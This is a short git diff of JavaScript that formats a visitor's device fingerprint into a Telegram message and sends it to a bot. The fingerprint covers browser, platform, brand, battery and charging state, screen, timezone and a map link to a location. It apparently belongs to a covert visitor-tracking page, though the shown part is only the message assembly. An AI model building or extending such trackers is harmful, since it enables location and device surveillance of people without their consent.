@@ -113,8 +113,11 @@ const message = `
 📋 *Device Info:*
 🤖 *User Agent:* ${escapeMarkdownV2(userAgent)}
 🌐 *Browser:* ${escapeMarkdownV2(browserName)}
-🖥️ *Platform:* ${escapeMarkdownV2(friendlyPlatform)}
+🖥️ *Platform:* ${escapeMarkdownV2(platform)}
+📱 *Brand:* ${escapeMarkdownV2(brand)}
 📱 *Device Type:* ${escapeMarkdownV2(deviceType)}
+🔋 *Battery Level:* ${escapeMarkdownV2(batteryLevel + "%")}
+🔌 *Charging:* ${escapeMarkdownV2(isCharging ? "Yes" : "No")}
 🗣️ *Language:* ${escapeMarkdownV2(language)}
 ⏰ *Timezone:* ${escapeMarkdownV2(timezone)}
 🖥️ *Screen:* ${escapeMarkdownV2(screenWidth + "x" + screenHeight)}
@@ -125,6 +128,7 @@ const message = `
 🗺️ *Map:* ${escapeMarkdownV2(mapLink)}
 🕒 *Timestamp:* ${escapeMarkdownV2(new Date().toLocaleString())}
 `;
+
 
     const telegramRes = await fetch(
       `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
